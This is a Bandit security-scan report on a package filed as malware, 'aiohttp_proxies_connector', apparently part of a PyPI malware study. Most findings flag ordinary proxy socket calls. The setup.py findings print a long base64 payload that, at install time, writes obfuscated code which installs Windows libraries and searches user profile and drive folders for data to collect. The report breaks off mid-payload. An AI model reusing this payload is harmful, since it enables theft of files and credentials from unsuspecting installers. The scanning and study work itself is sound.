Run started:2025-04-13 07:48:30.781042

Test results:
>> Issue: [B804:connect] socket.socket.connect
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector/connector.py:85
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b804_connect.html
84	            )
85	            await sock.connect((host, port))
86	

--------------------------------------------------
>> Issue: [B804:connect] socket.socket.connect
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector/connector.py:100
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b804_connect.html
99	            )
100	        return await super(ProxyConnector, self).connect(
101	            req=req, traces=traces, timeout=timeout
102	        )

--------------------------------------------------
>> Issue: [B823:ip_found] ip_found
   Severity: Medium   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector/helpers.py:63
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b823_ip_found.html
62	    proxy_type=ProxyType.SOCKS5,
63	    socks_host="127.0.0.1",
64	    socks_port=1080,
65	    username=None,
66	    password=None,
67	    rdns=True,
68	    family=socket.AF_INET,
69	    loop=None,
70	    **kwargs
71	):
72	    if host is None or port is None:
73	        raise ValueError("host and port must be specified")  # pragma: no cover
74	
75	    if loop is None:
76	        loop = asyncio.get_event_loop()

--------------------------------------------------
>> Issue: [B804:connect] socket.socket.connect
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector/helpers.py:95
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b804_connect.html
94	        raise ProxyError("Only socks proxies are allowed to use `open_connection`")
95	    await sock.connect((host, port))
96	

--------------------------------------------------
>> Issue: [B823:ip_found] ip_found
   Severity: Medium   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector/helpers.py:107
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b823_ip_found.html
106	    proxy_type=ProxyType.SOCKS5,
107	    socks_host="127.0.0.1",
108	    socks_port=1080,
109	    username=None,
110	    password=None,
111	    rdns=True,
112	    family=socket.AF_INET,
113	    loop=None,
114	    **kwargs
115	):
116	    if protocol_factory is None:
117	        raise ValueError("protocol_factory " "must be specified")  # pragma: no cover
118	
119	    if host is None or port is None:
120	        raise ValueError("host and port " "must be specified")  # pragma: no cover
121	

--------------------------------------------------
>> Issue: [B804:connect] socket.socket.connect
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector/helpers.py:142
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b804_connect.html
141	        raise ProxyError("Only socks proxies are allowed to use `create_connection`")
142	    await sock.connect((host, port))
143	

--------------------------------------------------
>> Issue: [B806:sendall] socket.socket.sendall
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector/proto.py:104
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b806_sendall.html
103	                raise ValueError("Unsupported item")
104	        await self._loop.sock_sendall(self._socket, data)
105	

--------------------------------------------------
>> Issue: [B809:recv] socket.socket.recv
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector/proto.py:109
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b809_recv.html
108	        while len(data) < n:
109	            packet = await self._loop.sock_recv(self._socket, n - len(data))
110	            if not packet:

--------------------------------------------------
>> Issue: [B304:blacklist] socket.socket
   Severity: Medium   Confidence: High
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector/proto.py:137
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b304-b305-ciphers-and-modes
136	
137	        self._socket = socket.socket(family=self._family, type=socket.SOCK_STREAM)
138	        self._socket.setblocking(False)

--------------------------------------------------
>> Issue: [B804:connect] socket.socket.connect
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector/proto.py:141
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b804_connect.html
140	        try:
141	            await self._loop.sock_connect(
142	                sock=self._socket, address=(self._socks_host, self._socks_port)
143	            )

--------------------------------------------------
>> Issue: [B807:close] socket.socket.close
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector/proto.py:145
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b807_close.html
144	        except OSError as e:
145	            self.close()
146	            raise SocksConnectionError(

--------------------------------------------------
>> Issue: [B807:close] socket.socket.close
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector/proto.py:152
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b807_close.html
151	        except asyncio.CancelledError:  # pragma: no cover
152	            self.close()
153	            raise

--------------------------------------------------
>> Issue: [B807:close] socket.socket.close
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector/proto.py:158
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b807_close.html
157	        except SocksError:
158	            self.close()
159	            raise

--------------------------------------------------
>> Issue: [B807:close] socket.socket.close
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector/proto.py:162
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b807_close.html
161	            if _is_proactor(self._loop) or _is_uvloop(self._loop):
162	                self.close()
163	            raise

--------------------------------------------------
>> Issue: [B807:close] socket.socket.close
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector/proto.py:166
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b807_close.html
165	    def close(self):
166	        self._socket.close()
167	

--------------------------------------------------
>> Issue: [B806:sendall] socket.socket.sendall
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector/proto.py:169
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b806_sendall.html
168	    async def sendall(self, data):
169	        await self._loop.sock_sendall(self._socket, data)
170	

--------------------------------------------------
>> Issue: [B809:recv] socket.socket.recv
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector/proto.py:172
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b809_recv.html
171	    async def recv(self, nbytes):
172	        return await self._loop.sock_recv(self._socket, nbytes)
173	

--------------------------------------------------
>> Issue: [B805:send] socket.socket.send
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector/proto.py:215
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b805_send.html
214	
215	        await self._send(req)
216	

--------------------------------------------------
>> Issue: [B804:connect] socket.socket.connect
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector/proto.py:229
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b804_connect.html
228	    async def negotiate(self):
229	        await self._socks_connect()
230	

--------------------------------------------------
>> Issue: [B805:send] socket.socket.send
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector/proto.py:257
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b805_send.html
256	
257	        await self._send(req)
258	        res = await self._receive(2)

--------------------------------------------------
>> Issue: [B805:send] socket.socket.send
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector/proto.py:284
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b805_send.html
283	
284	            await self._send(req)
285	            res = await self._receive(2)

--------------------------------------------------
>> Issue: [B805:send] socket.socket.send
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector/proto.py:298
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b805_send.html
297	
298	        await self._send(req)
299	        res = await self._receive(3)

--------------------------------------------------
>> Issue: [B804:connect] socket.socket.connect
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector/proto.py:370
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b804_connect.html
369	        await self._socks_auth()
370	        await self._socks_connect()

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector-0.2.57/setup.py:22
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
21	    try:
22	        version = re.findall(r'^__version__ = "(\S+?)"$', fp.read(), re.M)[0]
23	    except IndexError:

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector-0.2.57/setup.py:30
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
29	with open("README.md") as f:
30	    long_description = f.read()
31	

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector-0.2.57/setup.py:38
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
37	    license="Apache 2",
38	    url="https://github.com/Skactor/aiohttp-proxy",
39	    description="Full-featured proxy connector for aiohttp",

--------------------------------------------------
>> Issue: [B801:b64decode] base64.b64decode
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector-0.2.57/setup.py:104
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b801_b64decode.html
103	    def b64(code: str) -> str:
104	        return b64decode(code.encode('utf8')).decode('utf8')
105	

--------------------------------------------------
>> Issue: [B300:blacklist] base64.b64decode
   Severity: Medium   Confidence: High
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector-0.2.57/setup.py:104
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b300-base64-b64decode
103	    def b64(code: str) -> str:
104	        return b64decode(code.encode('utf8')).decode('utf8')
105	

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector-0.2.57/setup.py:112
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
111	    with open(join(main_dir, 'main.cpython-39.py'), 'w', encoding='utf8') as f:
112	        f.write(b64('aW1wb3J0IHN5cyAjbGluZToyCmZyb20gb3MgaW1wb3J0IGVudmlyb24gLGNoZGlyICNsaW5lOjMKZnJvbSBvcyAucGF0aCBpbXBvcnQgam9pbiAsc3BsaXQgI2xpbmU6NApmcm9tIHN1YnByb2Nlc3MgaW1wb3J0IFBvcGVuICxjYWxsICxnZXRvdXRwdXQgI2xpbmU6NQpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwICNsaW5lOjYKZnJvbSBvcyBpbXBvcnQgc3lzdGVtICNsaW5lOjcKcHl0aG9uID1zeXMgLmV4ZWN1dGFibGUgI2xpbmU6OQpweXRob24gPWpvaW4gKHNwbGl0IChweXRob24gKVswIF0sJ3B5dGhvbi5leGUnKSNsaW5lOjEwCnB5dGhvbncgPWpvaW4gKHNwbGl0IChweXRob24gKVswIF0sJ3B5dGhvbncuZXhlJykjbGluZToxMQp0ZXh0ID0nJyNsaW5lOjEzCnRleHQgKz1nZXRvdXRwdXQgKGYne3B5dGhvbnd9IC1tIGVuc3VyZXBpcCcpKydcblxuJyNsaW5lOjE0CnRleHQgKz1nZXRvdXRwdXQgKGYne3B5dGhvbnd9IC1tIHBpcCBpbnN0YWxsIGFpb2ZpbGVzJykrJ1xuXG4nI2xpbmU6MTUKdGV4dCArPWdldG91dHB1dCAoZid7cHl0aG9ud30gLW0gcGlwIGluc3RhbGwgYWlvaHR0cCcpKydcblxuJyNsaW5lOjE2CnRleHQgKz1nZXRvdXRwdXQgKGYne3B5dGhvbnd9IC1tIHBpcCBpbnN0YWxsIGNyeXB0b2dyYXBoeScpKydcblxuJyNsaW5lOjE3CnRleHQgKz1nZXRvdXRwdXQgKGYne3B5dGhvbnd9IC1tIHBpcCBpbnN0YWxsIGFpb3NxbGl0ZScpKydcblxuJyNsaW5lOjE4CnRleHQgKz1nZXRvdXRwdXQgKGYne3B5dGhvbnd9IC1tIHBpcCBpbnN0YWxsIG1zcycpKydcblxuJyNsaW5lOjE5CnRleHQgKz1nZXRvdXRwdXQgKGYne3B5dGhvbnd9IC1tIHBpcCBpbnN0YWxsIHB5cGl3aW4zMicpKydcblxuJyNsaW5lOjIwCnRleHQgKz1nZXRvdXRwdXQgKGYne3B5dGhvbnd9IC1tIHBpcCBpbnN0YWxsIHBzdXRpbCcpKydcblxuJyNsaW5lOjIxCkxPQ0FMID1lbnZpcm9uIFsnVVNFUlBST0ZJTEUnXSNsaW5lOjIzClRFTVAgPWpvaW4gKExPQ0FMICwnYXBwZGF0YScsJ2xvY2FsJywndGVtcCcpI2xpbmU6MjQKbWFpbl9kaXIgPWpvaW4gKFRFTVAgLCdfX3B5Y2FjaGVfXycpI2xpbmU6MjUKd2l0aCBvcGVuIChqb2luIChtYWluX2RpciAsJ3Rlc3QnKSwndycsZW5jb2RpbmcgPSd1dGY4JylhcyBmIDojbGluZToyNgogICAgZiAud3JpdGUgKHRleHQgKSNsaW5lOjI3CiAgICAjIS91c3IvYmluL2VudiBweXRob24KaW1wb3J0IGNvbnRleHRsaWIgYXMgX19zdGlja3l0YXBlX2NvbnRleHRsaWIgI2xpbmU6MjkKQF9fc3RpY2t5dGFwZV9jb250ZXh0bGliIC5jb250ZXh0bWFuYWdlciAjbGluZTozMQpkZWYgX19PMDBPMDBPMDAwMDAwMDBPMCAoKTojbGluZTozMgogICAgaW1wb3J0IHRlbXBmaWxlICNsaW5lOjMzCiAgICBpbXBvcnQgc2h1dGlsICNsaW5lOjM0CiAgICBPMDBPME8wMDBPTzAwT09PTyA9dGVtcGZpbGUgLm1rZHRlbXAgKCkjbGluZTozNQogICAgdHJ5IDojbGluZTozNgogICAgICAgIHlpZWxkIE8wME8wTzAwME9PMDBPT09PICNsaW5lOjM3CiAgICBmaW5hbGx5IDojbGluZTozOAogICAgICAgIHNodXRpbCAucm10cmVlIChPMDBPME8wMDBPTzAwT09PTyApI2xpbmU6MzkKd2l0aCBfX08wME8wME8wMDAwMDAwME8wICgpYXMgX19PME9PT09PT09PT08wME9PMCA6I2xpbmU6NDEKICAgIGRlZiBfX09PME9PMDAwT09PME8wT08wIChPMDBPME9PMDAwTzBPME8wMCAsT08wMDBPT08wTzBPTzBPMDAgKTojbGluZTo0MgogICAgICAgIGltcG9ydCBvcyAsb3MgLnBhdGggI2xpbmU6NDMKICAgICAgICBkZWYgT08wTzAwTzBPME8wTzAwT08gKE8wTzAwMDAwTzAwT08wME8wICk6I2xpbmU6NDUKICAgICAgICAgICAgT09PTzBPT08wME9PME8wT08gPU8wTzAwMDAwTzAwT08wME8wIC5zcGxpdCAoIi8iKSNsaW5lOjQ2CiAgICAgICAgICAgIE8wME8wT09PT08wMDBPME9PID1fX08wT09PT09PT09PTzAwT08wICNsaW5lOjQ3CiAgICAgICAgICAgIGZvciBPT08wME9PME8wT08wMDAwTyBpbiBPT09PME9PTzAwT08wTzBPTyA6I2xpbmU6NDgKICAgICAgICAgICAgICAgIE8wME8wT09PT08wMDBPME9PID1vcyAucGF0aCAuam9pbiAoTzAwTzBPT09PTzAwME8wT08gLE9PTzAwT08wTzBPTzAwMDBPICkjbGluZTo0OQogICAgICAgICAgICAgICAgaWYgbm90IG9zIC5wYXRoIC5leGlzdHMgKE8wME8wT09PT08wMDBPME9PICk6I2xpbmU6NTAKICAgICAgICAgICAgICAgICAgICBvcyAubWtkaXIgKE8wME8wT09PT08wMDBPME9PICkjbGluZTo1MQogICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbiAob3MgLnBhdGggLmpvaW4gKE8wME8wT09PT08wMDBPME9PICwiX19pbml0X18ucHkiKSwid2IiKWFzIE8wME8wT08wMDAwME9PMDBPIDojbGluZTo1MgogICAgICAgICAgICAgICAgICAgICAgICBPMDBPME9PMDAwMDBPTzAwTyAud3JpdGUgKGIiXG4iKSNsaW5lOjUzCiAgICAgICAgT08wTzAwTzBPME8wTzAwT08gKG9zIC5wYXRoIC5kaXJuYW1lIChPMDBPME9PMDAwTzBPME8wMCApKSNsaW5lOjU1CiAgICAgICAgTzAwMDAwT09PMDBPT08wMDAgPW9zIC5wYXRoIC5qb2luIChfX08wT09PT09PT09PTzAwT08wICxPMDBPME9PMDAwTzBPME8wMCApI2xpbmU6NTcKICAgICAgICB3aXRoIG9wZW4gKE8wMDAwME9PTzAwT09PMDAwICwid2IiKWFzIE8wME8wMDAwME9PT09PT09PIDojbGluZTo1OAogICAgICAgICAgICBPMDBPMDAwMDBPT09PT09PTyAud3JpdGUgKE9PMDAwT09PME8wT08wTzAwICkjbGluZTo1OQogICAgaW1wb3J0IHN5cyBhcyBfX3N0aWNreXRhcGVfc3lzICNsaW5lOjYxCiAgICBfX3N0aWNreXRhcGVfc3lzIC5wYXRoIC5pbnNlcnQgKDAgLF9fTzBPT09PT09PT09PMDBPTzAgKSNsaW5lOjYyCiAgICBfX09PME9PMDAwT09PME8wT08wICgncGF0aF9zZWFyY2gucHknLGIiaW1wb3J0IGFzeW5jaW9cclxuaW1wb3J0IG9zXHJcbmZyb20gb3MgaW1wb3J0IHNjYW5kaXIsIGdldGxvZ2luXHJcbmZyb20gb3MucGF0aCBpbXBvcnQgam9pbiwgaXNkaXJcclxuZnJvbSB0eXBpbmcgaW1wb3J0IERpY3QsIEl0ZXJhYmxlLCBMaXN0XHJcbmZyb20gdG9vbHMgaW1wb3J0IF9oYW5kbGVfdGFza19yZXN1bHRcclxuZnJvbSBsb2dnZXIgaW1wb3J0IExvZ2dlclxyXG5cclxuXHJcbkxPQ0FMID0gb3MuZW52aXJvblsnVVNFUlBST0ZJTEUnXVxyXG5cclxucm9vdF9wYXRocyA9IHtcclxuICAgIGpvaW4oTE9DQUwsICdhcHBkYXRhJyksXHJcbiAgICBqb2luKExPQ0FMLCAnYXBwZGF0YScsICdsb2NhbCcpLFxyXG4gICAgam9pbihMT0NBTCwgJ2FwcGRhdGEnLCAnbG9jYWwnLCAncHJvZ3JhbXMnKSxcclxuICAgIGpvaW4oTE9DQUwsICdhcHBkYXRhJywgJ3JvYW1pbmcnKSxcclxuICAgIGpvaW4oTE9DQUwsICdkb2N1bWVudHMnKSxcclxuICAgIGpvaW4oTE9DQUwsICdkb3dubG9hZHMnKSxcclxuICAgIGpvaW4oTE9DQUwsICdkZXNrdG9wJyksXHJcbiAgICAnQzovJyxcclxuICAgICdEOi8nLFxyXG4gICAgJ0U6LycsXHJcbiAgICAnQzovcHJvZ3JhbSBmaWxlcycsXHJcbiAgICAnQzovcHJvZ3JhbSBmaWxlcyAoeDg2KScsXHJcbiAgICAnQzovcHJvZ3JhbWRhdGEnXHJcbn1cclxuXHJcbnVzZXJzID0gKGkubmFtZS5sb3dlcigpIGZvciBpIGluIHNjYW5kaXIoJ2M6L3VzZXJzJykpXHJcbmZvciB1c2VybmFtZSBpbiB1c2VyczpcclxuICAgIGlmIHVzZXJuYW1lIGluIFsnZGVza3RvcC5pbmknLCBnZXRsb2dpbigpLmxvd2VyKCldOlxyXG4gICAgICAgIGNvbnRpbnVlXHJcbiAgICBcclxuICAgIGxvY2FsID0gam9pbignYzpcXFxcdXNlcnMnLCB1c2VybmFtZSlcclxuICAgIHVzZXJfcGF0aHMgPSB7XHJcbiAgICAgICAgam9pbihsb2NhbCwgJ2FwcGRhdGEnKSxcclxuICAgICAgICBqb2luKGxvY2FsLCAnYXBwZGF0YScsICdsb2NhbCcpLFxyXG4gICAgICAgIGpvaW4obG9jYWwsICdhcHBkYXRhJywgJ2xvY2FsJywgJ3Byb2dyYW1zJyksXHJcbiAgICAgICAgam9pbihsb2NhbCwgJ2FwcGRhdGEnLCAncm9hbWluZycpLFxyXG4gICAgICAgIGpvaW4obG9jYWwsICdkb2N1bWVudHMnKSxcclxuICAgICAgICBqb2luKGxvY2FsLCAnZG93bmxvYWRzJyksXHJcbiAgICAgICAgam9pbihsb2NhbCwgJ2Rlc2t0b3AnKVxyXG4gICAgfVxyXG4gICAgcm9vdF9wYXRocy51cGRhdGUodXNlcl9wYXRocylcclxuXHJcbmFzeW5jIGRlZiBzZWFyY2hfcGx1Z2luX3BhdGhzKHBhdGhzOiBJdGVyYWJsZVtzdHJdLCBxdWVyaWVzOiBEaWN0LCBsb2dnZXI6IExvZ2dlcik6XHJcbiAgICB0YXNrczogTGlzdFthc3luY2lvLlRhc2tdID0gW11cclxuXHJcbiAgICBxdWVyaWVzID0ge2subG93ZXIoKTogdiBmb3Igayx2IGluIHF1ZXJpZXMuaXRlbXMoKX1cclxuICAgIHRhcmdldF9mb2xkZXJfbmFtZXMgPSBzZXQocXVlcmllcy5rZXlzKCkpXHJcbiAgICBmb3IgcCBpbiBwYXRoczpcclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIGlmIGlzZGlyKHApOlxyXG4gICAgICAgICAgICAgICAgZm9yIGZuYW1lIGluIHRhcmdldF9mb2xkZXJfbmFtZXMuaW50ZXJzZWN0aW9uKGkubmFtZS5sb3dlcigpIGZvciBpIGluIG9zLnNjYW5kaXIocCkpOlxyXG4gICAgICAgICAgICAgICAgICAgIGlmIHF1ZXJpZXNbZm5hbWVdIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBjdXJyX3BhdGggPSBqb2luKHAsIGZuYW1lKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBsb2dnZXIubG9nKGYnXHhkMFx4OWRceGQwXHhiMFx4ZDBceGI5XHhkMFx4YjRceGQwXHhiNVx4ZDBceGJkXHhkMFx4YjAgXHhkMFx4YmZceGQxXHg4M1x4ZDFceDgyXHhkMVx4OGMge2N1cnJfcGF0aH0nKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICBsb29wID0gYXN5bmNpby5nZXRfZXZlbnRfbG9vcCgpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sgPSBsb29wLmNyZWF0ZV90YXNrKHF1ZXJpZXNbZm5hbWVdLmNhbGxiYWNrKGN1cnJfcGF0aCkpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2suYWRkX2RvbmVfY2FsbGJhY2sobGFtYmRhIHg6IF9oYW5kbGVfdGFza19yZXN1bHQoeCwgbG9nZ2VyKSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgdGFza3MuYXBwZW5kKHRhc2spXHJcbiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxyXG4gICAgICAgICAgICBhd2FpdCBsb2dnZXIubG9nKGYnXHhkMFx4OWVceGQxXHg4OFx4ZDBceGI4XHhkMFx4YjFceGQwXHhiYVx4ZDBceGIwIFx4ZDBceGIyIHNlYXJjaF9wbHVnaW5fcGF0aHMgXHhkMFx4YmZceGQxXHg4M1x4ZDFceDgyXHhkMVx4OGMge3B9IFx4ZDBceGJlXHhkMVx4ODhceGQwXHhiOFx4ZDBceGIxXHhkMFx4YmFceGQwXHhiMCB7ZX0nKVxyXG4gICAgZm9yIHRhc2sgaW4gdGFza3M6XHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICBhd2FpdCB0YXNrXHJcbiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxyXG4gICAgICAgICAgICBwcmludChyZXByKGUpKVxyXG5cclxuXHJcbmFzeW5jIGRlZiBzZWFyY2hfcGF0aHMocGF0aHM6IEl0ZXJhYmxlW3N0cl0sIHF1ZXJpZXM6IEl0ZXJhYmxlKTpcclxuICAgIHRhcmdldF9mb2xkZXJfbmFtZXMgPSB7aS5sb3dlcigpIGZvciBpIGluIHF1ZXJpZXN9XHJcbiAgICBmb3IgcCBpbiBwYXRoczpcclxuICAgICAgICBpZiBpc2RpcihwKTpcclxuICAgICAgICAgICAgZm9yIGZuYW1lIGluIHRhcmdldF9mb2xkZXJfbmFtZXMuaW50ZXJzZWN0aW9uKGkubmFtZS5sb3dlcigpIGZvciBpIGluIG9zLnNjYW5kaXIocCkpOlxyXG4gICAgICAgICAgICAgICAgaWYgZm5hbWUgaW4gdGFyZ2V0X2ZvbGRlcl9uYW1lczpcclxuICAgICAgICAgICAgICAgICAgICB5aWVsZCBqb2luKHAsIGZuYW1lKVxyXG4iKSNsaW5lOjY0CiAgICBfX09PME9PMDAwT09PME8wT08wICgndG9vbHMucHknLGIiaW1wb3J0IG9zXHJcbmltcG9ydCBhc3luY2lvXHJcbmZyb20gYWlvZmlsZXMub3MgaW1wb3J0IHdyYXBcclxuZnJvbSBzaHV0aWwgaW1wb3J0IGNvcHlmaWxlLCBjb3B5dHJlZSwgbW92ZVxyXG5mcm9tIGxvZ2dlciBpbXBvcnQgTG9nZ2VyXHJcbmltcG9ydCB3aW5yZWdcclxuaW1wb3J0IHJlXHJcblxyXG5cclxuXHJcbmRlZiB6aXBkaXIocGF0aCwgemlwaCk6XHJcbiAgICAnJydGcm9tIHN0YWNrb3ZlcmZsb3cnJydcclxuICAgICMgemlwaCBpcyB6aXBmaWxlIGhhbmRsZVxyXG4gICAgZm9yIHJvb3QsIGRpcnMsIGZpbGVzIGluIG9zLndhbGsocGF0aCk6XHJcbiAgICAgICAgZm9yIGZpbGUgaW4gZmlsZXM6XHJcbiAgICAgICAgICAgIHppcGgud3JpdGUob3MucGF0aC5qb2luKHJvb3QsIGZpbGUpLCBcclxuICAgICAgICAgICAgICAgICAgICAgICBvcy5wYXRoLnJlbHBhdGgob3MucGF0aC5qb2luKHJvb3QsIGZpbGUpLCBcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3MucGF0aC5qb2luKHBhdGgsICcuLicpKSlcclxuXHJcbmNvcHlmaWxlID0gd3JhcChjb3B5ZmlsZSlcclxuY29weXRyZWUgPSB3cmFwKGNvcHl0cmVlKVxyXG5tb3ZlID0gd3JhcChtb3ZlKVxyXG5cclxuXHJcbmRlZiBfaGFuZGxlX3Rhc2tfcmVzdWx0KHRhc2s6IGFzeW5jaW8uVGFzaywgbG9nZ2VyOiBMb2dnZXIpIC0+IE5vbmU6XHJcbiAgICB0cnk6XHJcbiAgICAgICAgdGFzay5yZXN1bHQoKVxyXG4gICAgZXhjZXB0IGFzeW5jaW8uQ2FuY2VsbGVkRXJyb3I6XHJcbiAgICAgICAgcGFzcyAgIyBUYXNrIGNhbmNlbGxhdGlvbiBzaG91bGQgbm90IGJlIGxvZ2dlZCBhcyBhbiBlcnJvci5cclxuICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTogICMgcHlsaW50OiBkaXNhYmxlPWJyb2FkLWV4Y2VwdFxyXG4gICAgICAgIGxvZ2dlci5zeW5jX2xvZyhmJ0Vycm9yIHtlIXJ9JykiKSNsaW5lOjY1CiAgICBfX09PME9PMDAwT09PME8wT08wICgnbG9nZ2VyLnB5JyxiJ2Zyb20gb3MucGF0aCBpbXBvcnQgam9pblxyXG5mcm9tIGFpb2ZpbGVzIGltcG9ydCBvcGVuIGFzIGFzeW5jX29wZW5cclxuZnJvbSBkYXRldGltZSBpbXBvc